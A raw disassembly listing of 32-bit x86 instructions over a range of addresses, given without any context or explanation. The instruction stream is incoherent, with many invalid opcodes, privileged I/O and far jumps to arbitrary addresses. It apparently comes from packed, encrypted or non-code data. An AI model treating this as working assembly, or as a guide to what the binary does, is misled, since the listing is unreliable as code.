  4098ff:	leave  
  409900:	xchg   ecx,eax
  409901:	xchg   esi,eax
  409902:	mov    eax,ds:0x7b3085cc
  409907:	ja     0x4098d5
  409909:	loop   0x40998a
  40990b:	mov    ecx,0x743eee07
  409910:	sub    bl,BYTE PTR [edi+0x57]
  409913:	jg     0x4098ee
  409915:	lahf   
  409916:	js     0x40993e
  409918:	and    esi,DWORD PTR [edi+0x7a]
  40991b:	or     WORD PTR [edx-0xbfcccf0],si
  409922:	fcmovb st,st(6)
  409924:	(bad)  
  409925:	pop    ss
  409926:	imul   esi,DWORD PTR [eax],0x90e3653
  40992c:	mov    edx,0xf8016b36
  409931:	retf   0x8422
  409934:	mov    ebp,0x640b04c5
  409939:	mov    ebx,0x77067766
  40993e:	enter  0x1d98,0xcc
  409942:	push   ecx
  409943:	(bad)  
  409944:	daa    
  409945:	aad    0x51
  409947:	fwait
  409948:	cmp    al,0x2d
  40994a:	push   edx
  40994b:	and    al,0xaf
  40994d:	pop    ecx
  40994e:	loop   0x4099c9
  409950:	dec    eax
  409951:	pop    ss
  409952:	xor    eax,0x3c676144
  409957:	adc    eax,0x2b21c9d
  40995c:	sbb    DWORD PTR [ebp-0x7f],0xc997315d
  409963:	add    al,0xb8
  409965:	mov    bl,0x27
  409967:	jns    0x409975
  409969:	xlat   BYTE PTR ds:[ebx]
  40996a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40996b:	es retf 0x74d4
  40996f:	dec    ecx
  409970:	and    al,0xb6
  409972:	mov    ebx,0xd86c48a5
  409977:	and    DWORD PTR [edi+eax*2],0xfffffff9
  40997b:	and    DWORD PTR [ebx+eiz*2],ebp
  40997e:	and    edi,edx
  409980:	adc    DWORD PTR [ebp-0x33fa93c],0x4d82e5a6
  40998a:	imul   DWORD PTR [ebx+edi*8]
  40998d:	inc    ebx
  40998e:	mov    BYTE PTR [edi-0x11],cl
  409991:	shl    DWORD PTR [esi-0x64],0x1f
  409995:	push   0xffffffed
  409997:	ds or  ax,0x29cc
  40999c:	(bad)  
  40999d:	cs jmp 0x72c9e543
  4099a3:	adc    eax,0x131900a5
  4099a8:	and    BYTE PTR [ebp+0x72e700],ch
  4099ae:	retf   
  4099af:	mov    dl,0x9e
  4099b1:	ins    DWORD PTR es:[edi],dx
  4099b2:	push   ds
  4099b3:	xchg   BYTE PTR es:[esi-0x25986479],bh
  4099ba:	ror    DWORD PTR [esi],0x70
  4099bd:	out    dx,al
  4099be:	mov    bl,0xd2
  4099c0:	jns    0x4099d5
  4099c2:	jl     0x409987
  4099c4:	retf   0x5b0a
  4099c7:	nop
  4099c8:	out    dx,al
  4099c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099ca:	cwde   
  4099cb:	popa   
  4099cc:	addr16 call 0xf02a:0x6e4f4560
  4099d4:	push   ebp
  4099d5:	pusha  
  4099d6:	cmp    ebp,ebp
  4099d8:	pop    edx
  4099d9:	jecxz  0x409983
  4099db:	jl     0x409a25
  4099dd:	add    BYTE PTR [ebp+0x3c],ch
  4099e0:	cmc    
  4099e1:	fucomp st(2)
  4099e3:	xchg   ecx,eax
  4099e4:	or     ch,BYTE PTR [ecx-0x1b3ba47b]
  4099ea:	test   al,0x49
  4099ec:	xchg   edx,eax
  4099ed:	aam    0x2a
  4099ef:	push   ss
  4099f0:	sub    BYTE PTR [edi-0x42],0xe5
  4099f4:	ja     0x4099d3
  4099f6:	repz add DWORD PTR [edx+eiz*1-0x4b],esi
  4099fb:	test   BYTE PTR es:[ebx+eiz*2+0x6639030a],dh
  409a03:	mov    cl,0x7e
  409a05:	fst    DWORD PTR [edx+0x15]
  409a08:	rcl    BYTE PTR [eax+0x643c3848],1
  409a0e:	xchg   BYTE PTR [ebp+eiz*8+0x49],dh
  409a12:	sub    al,0x6a
  409a14:	xchg   ecx,eax
  409a15:	sbb    ebx,edx
  409a17:	mov    ch,0x83
  409a19:	imul   eax,eax,0xddcf0465
  409a1f:	stos   DWORD PTR es:[edi],eax
  409a20:	pop    ebp
  409a21:	ja     0x409a7d
  409a23:	loop   0x409aa1
  409a25:	retf   0x8e5
  409a28:	fucomi st,st(4)
  409a2a:	pop    es
  409a2b:	into   
  409a2c:	into   
  409a2d:	lahf   
  409a2e:	or     edi,0x3f
  409a31:	inc    esi
  409a32:	sahf   
  409a33:	jecxz  0x409a52
  409a35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a36:	jl     0x4099d5
  409a38:	inc    ebp
  409a39:	xchg   BYTE PTR [eax],cl
  409a3b:	sbb    cl,cl
  409a3d:	add    eax,0xf3e3f1d3
  409a42:	cmc    
  409a43:	pop    ds
  409a44:	sub    BYTE PTR [esi-0x7],dl
  409a47:	mov    ds:0x872cc6e6,eax
  409a4c:	or     BYTE PTR ds:0xba82a9d3,0x70
  409a53:	sub    BYTE PTR [ecx],bh
  409a55:	jno    0x409ac4
  409a57:	dec    eax
  409a58:	in     al,0x34
  409a5a:	mov    ebp,0x4baa2cad
  409a5f:	sub    eax,0x40bb1939
  409a64:	stc    
  409a65:	mov    esi,0x2647f266
  409a6a:	out    0x48,al
  409a6c:	cmp    cl,BYTE PTR [ebx+0x6464b6db]
  409a72:	std    
  409a73:	cmp    dh,BYTE PTR [edi+0x72]
  409a76:	mov    cl,0x7
  409a78:	add    BYTE PTR [esi],bh
  409a7a:	jne    0x409aa3
  409a7c:	mov    al,0xfe
  409a7e:	inc    ebx
  409a7f:	and    ecx,edx
  409a81:	push   ss
  409a82:	int3   
  409a83:	mov    WORD PTR [edx],cs
  409a85:	int3   
  409a86:	test   eax,0x8bc6b8fe
  409a8c:	mov    al,ds:0xcd49bb
  409a91:	rol    DWORD PTR [eax-0x434fe09b],1
  409a97:	jg     0x409af4
  409a99:	cli    
  409a9a:	add    dh,BYTE PTR [ebx]
  409a9c:	push   ss
  409a9d:	xor    eax,0xa1f4661f
  409aa2:	jb     0x409a28
  409aa4:	dec    esp
  409aa5:	add    esi,0xa147f408
  409aab:	bound  ecx,QWORD PTR [ecx]
  409aad:	sub    DWORD PTR [edi],edx
  409aaf:	sbb    DWORD PTR [ebx+0x21a0adef],ebp
  409ab5:	rcl    BYTE PTR [ecx-0x12],cl
  409ab8:	cmp    al,0xb5
  409aba:	mov    bh,0x15
  409abc:	mov    edi,0x75022b52
  409ac1:	xchg   esp,eax
  409ac2:	lahf   
  409ac3:	repz mov eax,ds:0xdcd5197b
  409ac9:	cwde   
  409aca:	ss hlt 
  409acc:	dec    edi
  409acd:	xor    dh,BYTE PTR [ebx]
  409acf:	sub    BYTE PTR [ebx+esi*4],cl
  409ad2:	add    al,0x85
  409ad4:	add    al,0x49
  409ad6:	fucompp 
  409ad8:	push   edx
  409ad9:	arpl   WORD PTR [esi-0x4e],bp
  409adc:	cmp    al,0xb
  409ade:	shr    DWORD PTR ds:0x6f3dccb4,cl
  409ae4:	sbb    edx,ebx
  409ae6:	popa   
  409ae7:	loopne 0x409b64
  409ae9:	stos   BYTE PTR es:[edi],al
  409aea:	jl     0x409a85
  409aec:	xlat   BYTE PTR ds:[ebx]
  409aed:	shl    DWORD PTR [ebp-0x106c3f0],0x7c
  409af4:	xchg   esi,eax
  409af5:	xchg   DWORD PTR [ebx],esp
  409af7:	lods   eax,DWORD PTR ds:[esi]
  409af8:	out    dx,al
  409af9:	retf   
  409afa:	outs   dx,DWORD PTR ds:[esi]
  409afb:	push   ebx
  409afc:	or     al,0xe2
  409afe:	push   eax
  409aff:	loopne 0x409aca
  409b01:	sbb    BYTE PTR [esi-0x50],dl
  409b04:	lock mov eax,esp
  409b07:	sbb    eax,0x19ddc954
  409b0c:	inc    ecx
  409b0d:	lods   al,BYTE PTR ds:[esi]
  409b0e:	stc    
  409b0f:	mov    ebx,0xdb1a4f67
  409b14:	cmp    eax,0x91c95bb8
  409b19:	mov    ecx,0x661dbae
  409b1e:	jmp    0xdb18:0xaf515ab4
  409b25:	loop   0x409af5
  409b27:	push   eax
  409b28:	lahf   
  409b29:	pop    ebp
  409b2a:	aaa    
  409b2b:	mov    esp,0xaf7cc339
  409b30:	es (bad) 
  409b33:	inc    ebx
  409b34:	jmp    0x2a64ae3b
  409b39:	xor    BYTE PTR [eax+ebx*2+0x1f],dh
  409b3d:	mov    fs:0x4e143d18,eax
  409b43:	dec    edi
  409b44:	lea    ebx,[ebx+edi*2]
  409b47:	cmp    ecx,DWORD PTR [eax+0x6]
  409b4a:	das    
  409b4b:	mov    esp,0xbfad3d23
  409b50:	cdq    
  409b51:	(bad)  
  409b52:	pop    esi
  409b53:	mov    al,ds:0x51e8a84e
  409b58:	sub    al,0x1f
  409b5a:	jne    0x409b67
  409b5c:	adc    BYTE PTR ds:0x1a46a3ce,cl
  409b62:	jno    0x409bb3
  409b64:	push   0xffffffd7
  409b66:	cld    
  409b67:	imul   esi,DWORD PTR [edi],0x27
  409b6a:	and    ecx,DWORD PTR [eax-0x7887340d]
  409b70:	jle    0x409b76
  409b72:	add    al,0x30
  409b74:	dec    esp
  409b75:	jp     0x409bc8
  409b77:	xchg   edx,eax
  409b78:	xor    esi,DWORD PTR [eax+0x5b]
  409b7b:	mov    ecx,0xbb0d82a7
  409b80:	cmp    al,0x10
  409b82:	mov    ecx,0x3be168b8
  409b87:	out    0x7c,eax
  409b89:	iret   
  409b8a:	stc    
  409b8b:	stc    
  409b8c:	pop    ecx
  409b8d:	outs   dx,BYTE PTR ds:[esi]
  409b8e:	shr    BYTE PTR [ecx-0x766f8765],1
  409b94:	mov    cl,BYTE PTR [esi-0x11]
  409b97:	mov    BYTE PTR [edi],al
  409b99:	mov    cl,0xe3
  409b9b:	push   esp
  409b9c:	inc    esi
  409b9d:	inc    ebp
  409b9e:	aam    0xa7
  409ba0:	mov    ds:0xaa2422d6,eax
  409ba5:	sbb    al,0xca
  409ba7:	pop    esi
  409ba8:	dec    ebp
  409ba9:	push   0xffffffd2
  409bab:	and    eax,0x75b8a165
  409bb0:	loope  0x409bcf
  409bb2:	inc    esp
  409bb3:	lock int3 
  409bb5:	out    0x63,eax
  409bb7:	xor    DWORD PTR [ebx+0x4e],ebx
  409bba:	xlat   BYTE PTR ds:[ebx]
  409bbb:	sbb    DWORD PTR [ebx-0x48],0xe8ab2427
  409bc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bc3:	push   ecx
  409bc4:	adc    BYTE PTR [ecx],bh
  409bc6:	mov    ch,0x5e
  409bc8:	out    0xd8,eax
  409bca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bcc:	xchg   ebp,eax
  409bcd:	inc    edi
  409bce:	scas   al,BYTE PTR es:[edi]
  409bcf:	adc    BYTE PTR [ebp+0x476e7f2d],dh
  409bd5:	rol    bh,0x98
  409bd8:	fiadd  DWORD PTR [ecx]
  409bda:	mov    esi,0xf95600b9
  409bdf:	imul   ebx,DWORD PTR [ebx+0x133f6ef],0x3a10ebdf
  409be9:	inc    ebp
  409bea:	repnz mov al,0x93
  409bed:	push   ebp
  409bee:	inc    ebp
  409bef:	ss xchg edx,eax
  409bf1:	jae    0x409c5c
  409bf3:	push   esp
  409bf4:	push   ebx
  409bf5:	daa    
  409bf6:	adc    eax,eax
  409bf8:	push   ds
  409bf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bfa:	pop    ebp
  409bfb:	imul   eax,DWORD PTR [ecx+0x1ca18c22],0xe82a2e35
  409c05:	daa    
  409c06:	inc    esi
  409c07:	mov    ecx,0xd4a55fc0
  409c0c:	pop    edi
  409c0d:	cmp    eax,0xdcf999a7
  409c12:	ficomp DWORD PTR [esi+0x751f3fcc]
  409c18:	daa    
  409c19:	icebp  
  409c1a:	pop    eax
  409c1b:	push   esp
  409c1c:	pop    edx
  409c1d:	scas   al,BYTE PTR es:[edi]
  409c1e:	xchg   BYTE PTR [edx-0x66482550],bl
  409c24:	mov    ds:0x86872608,eax
  409c29:	push   ebp
  409c2a:	or     DWORD PTR [esi-0x5a],eax
  409c2d:	loop   0x409c32
  409c2f:	sbb    BYTE PTR [eax-0x3501c2de],bh
  409c35:	add    ecx,DWORD PTR [ebx+0x2bde2f0d]
  409c3b:	sub    DWORD PTR [ecx+0x6b],esp
  409c3e:	scas   al,BYTE PTR es:[edi]
  409c3f:	out    dx,eax
  409c40:	and    ebx,DWORD PTR [esi+ecx*1-0x6c]
  409c44:	aaa    
  409c45:	retf   
  409c46:	jmp    0x409c52
  409c48:	push   esp
  409c49:	cmp    DWORD PTR [edx-0x4ab65345],ebp
  409c4f:	int3   
  409c50:	lods   al,BYTE PTR ds:[esi]
  409c51:	cli    
  409c52:	lock and cl,dl
  409c55:	xor    al,0x58
  409c57:	and    eax,0x85692ed2
  409c5c:	xchg   ebx,eax
  409c5d:	add    eax,0xcf7cb16e
  409c62:	int3   
  409c63:	rol    BYTE PTR [eax+0x4e],1
  409c66:	repnz fdivr DWORD PTR [esi]
  409c69:	xchg   esp,eax
  409c6a:	xchg   edx,eax
  409c6b:	sbb    ah,ch
  409c6d:	(bad)  
  409c6e:	loop   0x409c5e
  409c70:	pop    es
  409c71:	xchg   DWORD PTR [ecx-0x79],ebp
  409c74:	dec    ebp
  409c75:	fstp   DWORD PTR [eax+0x7e]
  409c78:	ficomp WORD PTR [ecx]
  409c7a:	inc    edi
  409c7b:	dec    ebp
  409c7c:	icebp  
  409c7d:	adc    BYTE PTR [ebx-0x713b27f1],0x86
  409c84:	and    eax,0x63f02796
  409c89:	int3   
  409c8a:	mov    ecx,0xf6ca6384
  409c8f:	cmp    al,0x44
  409c91:	retf   
  409c92:	shr    DWORD PTR [edx-0x6772895f],cl
  409c98:	jp     0x409d09
  409c9a:	(bad)  
  409c9b:	imul   esi,esp,0xffffffba
  409c9e:	shl    bh,cl
  409ca0:	and    eax,0xfd7e317d
  409ca5:	jge    0x409c9b
  409ca7:	jbe    0x409cbc
  409ca9:	push   ds
  409caa:	mov    esp,0xedd64ec5
  409caf:	push   eax
  409cb0:	jns    0x409c8a
  409cb2:	xor    al,0x5b
  409cb4:	cld    
  409cb5:	in     al,0x93
  409cb7:	mov    ss,WORD PTR [edx-0x15]
  409cba:	cmp    al,dh
  409cbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cbd:	imul   edx,DWORD PTR [ecx+ebp*4+0xb2ad61a],0xfffffff1
  409cc5:	in     eax,dx
  409cc6:	icebp  
  409cc7:	shl    BYTE PTR [eax],cl
  409cc9:	test   DWORD PTR [ebx+0x4a0e304],edi
  409ccf:	fwait
  409cd0:	jecxz  0x409c64
  409cd2:	inc    esp
  409cd3:	inc    edx
  409cd4:	pop    ss
  409cd5:	in     al,0x73
  409cd7:	inc    eax
  409cd8:	add    al,0x27
  409cda:	adc    ecx,eax
  409cdc:	(bad)  
  409cdd:	cwde   
  409cde:	push   ss
  409cdf:	je     0x409ce9
  409ce1:	or     al,0x57
  409ce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ce5:	cmp    DWORD PTR [esi+ebx*1],ecx
  409ce8:	pop    ss
  409ce9:	sbb    eax,0x75f323b1
  409cee:	mov    ecx,0xd1240d55
  409cf3:	outs   dx,BYTE PTR ds:[esi]
  409cf4:	sbb    bh,BYTE PTR [edx+0x6b]
  409cf7:	cmp    al,0x48
  409cf9:	aas    
  409cfa:	sub    cl,BYTE PTR [edi-0x14]
  409cfd:	add    BYTE PTR [esi-0x80],dl
  409d00:	sub    DWORD PTR [ebp+eiz*4+0x754b043a],0xf501175
  409d0b:	push   0x6d
  409d0d:	push   ebp
  409d0e:	inc    ah
  409d10:	shr    DWORD PTR [ecx],0x88
  409d13:	fist   WORD PTR [ecx]
  409d15:	je     0x409d04
  409d17:	xchg   ah,ah
  409d19:	xchg   esp,eax
  409d1a:	mov    ch,0x69
  409d1c:	mov    bh,0xba
  409d1e:	add    al,0x77
  409d20:	jbe    0x409d15
  409d22:	mov    BYTE PTR [ebp+0x1e],bl
  409d25:	push   edx
  409d26:	xchg   ecx,eax
  409d27:	out    dx,eax
  409d28:	add    al,bl
  409d2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d2b:	and    DWORD PTR [edx],0xffffffe9
  409d2e:	mov    dl,0xf8
  409d30:	dec    BYTE PTR [ebp+0x114bf5bf]
  409d36:	add    BYTE PTR [ecx+0xa],ah
  409d39:	aam    0x7f
  409d3b:	xor    eax,0x8ff0bdb
  409d40:	fidivr DWORD PTR [ecx+0xa]
  409d43:	das    
  409d44:	xchg   al,cl
  409d46:	push   ss
  409d47:	sahf   
  409d48:	dec    ecx
  409d49:	daa    
  409d4a:	xor    BYTE PTR [eax+0x3e],dl
  409d4d:	popf   
  409d4e:	sub    al,0xef
  409d50:	add    esp,edx
  409d52:	mov    ?,WORD PTR [esp+ebp*8+0x53]
  409d56:	sbb    ch,al
  409d58:	in     al,0x73
  409d5a:	fcom   st(3)
  409d5c:	ins    DWORD PTR es:[edi],dx
  409d5d:	xchg   ecx,eax
  409d5e:	xchg   edx,eax
  409d5f:	ss enter 0x48ea,0x3f
  409d64:	inc    esi
  409d65:	lahf   
  409d66:	and    BYTE PTR [ebp-0x25],0xce
  409d6a:	push   0xe53db6e6
  409d6f:	(bad)  [eax-0x25e388df]
  409d75:	xlat   BYTE PTR ds:[ebx]
  409d76:	or     al,0x83
  409d78:	push   ebp
  409d79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d7a:	jno    0x409ddf
  409d7c:	push   edx
  409d7d:	sahf   
  409d7e:	sbb    ecx,edx
  409d80:	jb     0x409d27
  409d82:	aas    
  409d83:	ss xchg ebx,eax
  409d85:	inc    ebx
  409d86:	loope  0x409d49
  409d88:	sbb    eax,0x63b4cdbe
  409d8d:	test   eax,0x52aff4ad
  409d92:	sub    ch,BYTE PTR [edx+0x7e]
  409d95:	les    edx,FWORD PTR [ecx+0xcfecde4]
  409d9b:	arpl   WORD PTR [eax-0x3e],ax
  409d9e:	(bad)  
  409d9f:	mov    dl,0x79
  409da1:	jne    0x409daf
  409da3:	add    bh,cl
  409da5:	ds fwait
  409da7:	es cs push esi
  409daa:	mov    eax,ds:0xe7f5806c
  409daf:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  409db1:	retf   0xd3d5
  409db4:	jecxz  0x409d45
  409db6:	and    al,0xf6
  409db8:	sbb    edx,DWORD PTR [eax]
  409dba:	xor    DWORD PTR [ecx-0x4d],esp
  409dbd:	cli    
  409dbe:	cwde   
  409dbf:	mov    esi,0xa52470a6
  409dc4:	jmp    0x1980d593
  409dc9:	rcl    BYTE PTR [edi+0x76],0x94
  409dcd:	and    dl,BYTE PTR [edi+esi*8]
  409dd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dd1:	stc    
  409dd2:	xchg   ebx,eax
  409dd3:	cmp    eax,0x8ce64970
  409dd8:	jae    0x409d77
  409dda:	jo     0x409d62
  409ddc:	repz and esi,DWORD PTR [ebx+0x178556b6]
  409de3:	push   ebx
  409de4:	pop    ss
  409de5:	ja     0x409df4
  409de7:	xor    eax,0xc853c15b
  409dec:	jbe    0x409e2b
  409dee:	int3   
  409def:	or     edi,DWORD PTR [esi-0x38ac4f81]
  409df5:	pop    ebp
  409df6:	dec    ebp
  409df7:	lods   al,BYTE PTR ds:[esi]
  409df8:	push   ss
  409df9:	cmc    
  409dfa:	jge    0x409db3
  409dfc:	mov    ch,0x5
  409dfe:	call   0x94eb41fd
  409e03:	fwait
  409e04:	int3   
  409e05:	mov    al,0xa
  409e07:	adc    dh,BYTE PTR [eax-0x5fd91d0a]
  409e0d:	push   esi
  409e0e:	aaa    
  409e0f:	call   0xc4e6:0x7fd6f3b1
  409e16:	sar    BYTE PTR [ebx-0x3b],cl
  409e19:	add    bl,BYTE PTR [edi+0x51]
  409e1c:	lods   eax,DWORD PTR ds:[esi]
  409e1d:	push   ebx
  409e1e:	and    ch,BYTE PTR [esi]
  409e20:	shl    BYTE PTR [eax],0x80
  409e23:	arpl   sp,cx
  409e25:	xor    BYTE PTR [ecx+0x35e26463],ch
  409e2b:	jne    0x409de0
  409e2d:	sub    ebp,DWORD PTR [esi-0x312225b7]
  409e33:	sub    cl,bl
  409e35:	jmp    0x46711652
  409e3a:	sub    esi,0x62
  409e3d:	ins    BYTE PTR es:[edi],dx
  409e3e:	sub    DWORD PTR [ebx-0x437b7fb8],esp
  409e44:	cmp    edx,DWORD PTR [esi+0x6e]
  409e47:	push   esp
  409e48:	test   DWORD PTR [edi+0x6346f6e1],esp
  409e4e:	push   0xa40b0da1
  409e53:	mov    WORD PTR [edx-0x59],fs
  409e56:	adc    eax,0x49128fcb
  409e5b:	fistp  DWORD PTR [ebx-0x10]
  409e5e:	and    bh,BYTE PTR [edx]
  409e60:	sub    al,0xd4
  409e62:	sbb    eax,0x81dd48c3
  409e67:	aam    0xab
  409e69:	cmp    DWORD PTR [esi+0x70],edx
  409e6c:	das    
  409e6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e6f:	mov    esi,0x1a0b8943
  409e74:	js     0x409e4e
  409e76:	or     DWORD PTR [ebx+0x6c],0x4b2812ff
  409e7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e7e:	adc    ecx,esp
  409e80:	mov    al,0x3d
  409e82:	xchg   ecx,edi
  409e84:	dec    ecx
  409e85:	pop    edx
  409e86:	int3   
  409e87:	inc    edi
  409e88:	mov    edi,0x3701342f
  409e8d:	out    0xf5,eax
  409e8f:	jmp    0x409e68
  409e91:	mov    bh,0x79
  409e93:	mov    ebx,0x7b3daf7e
  409e98:	sti    
  409e99:	sub    eax,0x5b04e717
  409e9e:	xchg   esp,eax
  409e9f:	ror    edx,0xe2
  409ea2:	(bad)  
  409ea3:	scas   al,BYTE PTR es:[edi]
  409ea4:	or     esp,DWORD PTR [ecx+0x21]
  409ea7:	add    ebx,DWORD PTR [edi-0x7f75b03d]
  409ead:	je     0x409e7f
  409eaf:	ds xor al,0x93
  409eb2:	jae    0x409eca
  409eb4:	cld    
  409eb5:	loop   0x409e52
  409eb7:	out    dx,al
  409eb8:	(bad)  
  409eb9:	mov    esi,0x35082299
  409ebf:	and    eax,0xb68357e4
  409ec4:	test   BYTE PTR [ecx-0x47ffaf03],bl
  409eca:	jge    0x409ea6
  409ecc:	and    ah,0x5b
  409ecf:	bnd jbe 0x409f37
  409ed2:	repz cmc 
  409ed4:	rol    DWORD PTR [ebp-0x77],1
  409ed7:	jecxz  0x409ec1
  409ed9:	xlat   BYTE PTR ds:[ebx]
  409eda:	jmp    0x409ed4
  409edc:	bound  esp,QWORD PTR [ebp+0xbd45827]
  409ee2:	aaa    
  409ee3:	and    eax,0x326e99d1
  409ee8:	add    bl,ah
  409eea:	jae    0x409f53
  409eec:	sub    edx,esi
  409eee:	and    ah,BYTE PTR [ebx+0x37]
  409ef1:	pop    esi
  409ef2:	cmp    bl,BYTE PTR [esi+0x29b94433]
  409ef8:	mul    DWORD PTR ds:0x8fdc2651
  409efe:	push   cs
  409eff:	aas    
  409f00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f01:	dec    esi
  409f02:	mov    ds:0xb2a27d70,al
  409f07:	mov    al,ds:0x9d959347
  409f0c:	into   
  409f0d:	push   ds
  409f0e:	fiadd  DWORD PTR [ecx-0x51863985]
  409f14:	pop    esp
  409f15:	ss xchg ebp,eax
  409f17:	test   BYTE PTR [ebx+0x335e6b6c],ch
  409f1d:	xchg   ebx,eax
  409f1e:	hlt    
  409f1f:	mov    ebp,0x5b92f1d2
  409f24:	ins    DWORD PTR es:[edi],dx
  409f25:	dec    ecx
  409f26:	xchg   esi,eax
  409f27:	or     ah,BYTE PTR [eax]
  409f29:	rol    BYTE PTR [eax-0x6c],1
  409f2c:	sub    eax,0x2a0aa537
  409f31:	loop   0x409f09
  409f33:	jecxz  0x409ee9
  409f35:	pop    es
  409f36:	push   0xc89b606b
  409f3b:	mov    ebp,0x52a17c6c
  409f40:	les    ecx,FWORD PTR [ebp+0xadb19e3]
  409f46:	jne    0x409f7c
  409f48:	scas   al,BYTE PTR es:[edi]
  409f49:	fcom   DWORD PTR [edi+ecx*4+0x2a64410f]
  409f50:	push   ebp
  409f51:	inc    esi
  409f52:	les    eax,FWORD PTR [edi+edi*2]
  409f55:	or     cl,BYTE PTR ds:0x5474beb8
  409f5b:	lahf   
  409f5c:	mov    cl,0x5f
  409f5e:	jmp    0x409f13
  409f60:	mov    esp,edx
  409f62:	pop    edi
  409f63:	cmc    
  409f64:	jp     0x409fd4
  409f66:	push   es
  409f67:	or     DWORD PTR [ecx+edx*2+0x5e29040],0x4c
  409f6f:	pop    esi
  409f70:	fbld   TBYTE PTR [edi]
  409f72:	loope  0x409f7c
  409f74:	sub    eax,0x514078da
  409f79:	push   ebp
  409f7a:	cmp    ebp,DWORD PTR [eax+0x2ecf80e1]
  409f80:	ja     0x409f5a
  409f82:	adc    dh,BYTE PTR [edx+esi*8]
  409f85:	in     eax,0x99
  409f87:	stos   BYTE PTR es:[edi],al
  409f88:	mov    al,ds:0x93734528
  409f8d:	or     esp,DWORD PTR [ecx]
  409f8f:	fwait
  409f90:	add    DWORD PTR [eax],edi
  409f92:	aaa    
  409f93:	push   cs
  409f94:	call   0xec7e5326
  409f99:	ins    DWORD PTR es:[edi],dx
  409f9a:	pop    es
  409f9b:	add    eax,DWORD PTR [esi]
  409f9d:	lods   eax,DWORD PTR ds:[esi]
  409f9e:	aam    0xca
  409fa0:	das    
  409fa1:	inc    ebp
  409fa2:	imul   ecx,DWORD PTR [eax-0x1e6c2bf5],0x6326a0be
  409fac:	or     DWORD PTR [eax-0x12],ecx
  409faf:	inc    ecx
  409fb0:	(bad)  
  409fb1:	stc    
  409fb2:	push   ebp
  409fb3:	repnz int 0xaa
  409fb6:	mov    ss,WORD PTR [edi-0x21]
  409fb9:	push   ds
  409fba:	jl     0x409f47
  409fbc:	mov    DWORD PTR [edi+0x57774ab1],ebp
  409fc2:	xor    eax,0x6e123cb7
  409fc7:	outs   dx,DWORD PTR ds:[esi]
  409fc8:	inc    edx
  409fc9:	jmp    0xb99f:0x5896ab7
  409fd0:	sub    DWORD PTR [edi],ecx
  409fd2:	push   cs
  409fd3:	sti    
  409fd4:	pushf  
  409fd5:	and    ebp,DWORD PTR [edi+0x4309173b]
  409fdb:	pop    esp
  409fdc:	out    0xc1,eax
  409fde:	sub    DWORD PTR [ebx-0x154e075d],0xa
  409fe5:	mov    WORD PTR [eax-0x4f],?
  409fe8:	imul   esp,DWORD PTR es:[eax-0x60381c95],0xffffff88
  409ff0:	adc    ebp,DWORD PTR [edx]
  409ff2:	sub    DWORD PTR [ecx+0x11],esp
  409ff5:	xchg   edx,eax
  409ff6:	outs   dx,BYTE PTR ds:[esi]
  409ff7:	adc    al,0x44
  409ff9:	push   eax
  409ffa:	or     eax,0x52cd589d
  409fff:	pop    esp
  40a000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a001:	dec    edi
  40a002:	sub    esp,ebp
  40a004:	pushf  
  40a005:	and    dl,ch
  40a007:	enter  0xaf5d,0x52
  40a00b:	scas   al,BYTE PTR es:[edi]
  40a00c:	adc    al,0xec
  40a00e:	cmp    DWORD PTR [edi],edi
  40a010:	ins    DWORD PTR es:[edi],dx
  40a011:	xlat   BYTE PTR ds:[ebx]
  40a012:	or     DWORD PTR [ebp-0x70],ebx
  40a015:	jb     0x40a07b
  40a017:	inc    ebp
  40a018:	retf   
  40a019:	arpl   cx,si
  40a01b:	mov    dl,0xe9
  40a01d:	test   dh,bl
  40a01f:	in     eax,dx
  40a020:	cmp    al,0x88
  40a022:	dec    ecx
  40a023:	scas   al,BYTE PTR es:[edi]
  40a024:	bnd jg 0x40a089
  40a027:	lea    ecx,[ecx-0x544bff65]
  40a02d:	mov    ah,0xa
  40a02f:	push   ds
  40a030:	adc    al,bl
  40a032:	outs   dx,BYTE PTR ds:[esi]
  40a033:	sahf   
  40a034:	cld    
  40a035:	in     eax,0xdc
  40a037:	mov    cl,0x34
  40a039:	add    bh,BYTE PTR [ebx]
  40a03b:	add    BYTE PTR [ecx],dh
  40a03d:	add    al,0x61
  40a03f:	rol    dl,cl
  40a041:	push   ss
  40a042:	scas   eax,DWORD PTR es:[edi]
  40a043:	clc    
  40a044:	jno    0x40a0c1
  40a046:	jo     0x409ffc
  40a048:	fsubrp st(3),st
  40a04a:	lea    edi,[edi]
  40a04c:	push   edi
  40a04d:	push   ss
  40a04e:	mov    al,0xaa
  40a050:	rcr    BYTE PTR [ebx+ebx*4+0x2],cl
  40a054:	inc    edi
  40a055:	dec    ebx
  40a056:	add    edi,ebp
  40a058:	push   0xdfc0e864
  40a05d:	jl     0x40a073
  40a05f:	(bad)  
  40a060:	(bad)  
  40a061:	sahf   
  40a062:	or     DWORD PTR [edx],esi
  40a064:	adc    eax,0x29d674bf
  40a069:	mov    eax,0xc209e0b4
  40a06e:	adc    bh,dl
  40a070:	add    eax,0x7b1be66d
  40a075:	adc    al,0xe
  40a077:	stos   BYTE PTR es:[edi],al
  40a078:	sbb    al,0x58
  40a07a:	add    DWORD PTR [esi],edi
  40a07c:	leave  
  40a07d:	shl    DWORD PTR [ebx-0x56],cl
  40a080:	ins    BYTE PTR es:[edi],dx
  40a081:	mov    ebp,0x4f77b377
  40a086:	jne    0x40a0a7
  40a088:	dec    eax
  40a089:	or     DWORD PTR [ecx-0x5],edx
  40a08c:	jge    0x40a105
  40a08e:	cdq    
